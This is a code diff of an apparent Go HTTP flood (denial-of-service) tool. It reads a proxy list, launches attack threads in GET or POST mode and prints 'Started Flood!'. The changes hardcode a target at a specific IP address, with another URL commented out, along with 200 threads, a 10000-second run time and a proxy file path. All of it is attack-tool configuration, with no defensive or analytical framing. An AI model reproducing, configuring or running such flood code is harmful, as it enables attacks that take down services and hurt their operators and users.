@@ -34,22 +34,22 @@ func main() {
 		return
 	}*/
 
-	var HTTPVersion string
-	var Url string
+	//var HTTPVersion string
+	//var Url string = "https://also.black/hit"
+	Url := "http://88.198.8.149"
 	var HTTP_HOST string
-	var limit int
-	var proxyFile string
-	var threads int
-	var mode string
-	var dur int
+	var limit int = 2
+	var proxyFile string = "proxyFile.txt"
+	var threads int = 200
+	var mode string = "GET"
+	var dur int = 10000
 	var cookie interface{}
 	var data interface{}
-	fmt.Sprint(HTTPVersion)
 
 	Arguments := os.Args[1:]
 	for _, x := range Arguments {
 		if strings.Contains(x, "version=") {
-			HTTPVersion = strings.Split(x, "=")[1]
+			//HTTPVersion = strings.Split(x, "=")[1]
 		} else if strings.Contains(x, "url=") {
 			Url = strings.Split(x, "=")[1]
 		} else if strings.Contains(x, "domain=") {
@@ -82,7 +82,7 @@ func main() {
 		mode = "POST"
 	}
 
-	f, err := os.Open(proxyFile)
+	f, err := os.Open("C://" + proxyFile)
 	if err != nil {
 		fmt.Println("Proxy file does not exist!", err)
 		return
@@ -110,7 +110,7 @@ func main() {
 	}
 	Sys = System{
 		//Banner:       ShareBanner,
-		HTTP2Timeout: 10000,
+		HTTP2Timeout: 1000,
 		Attack:       &New,
 	}
 
@@ -123,4 +123,5 @@ func main() {
 	close(start)
 	fmt.Println("Started Flood!")
 	time.Sleep(time.Duration(dur) * time.Second)
+	fmt.Println("end of flood")
 }
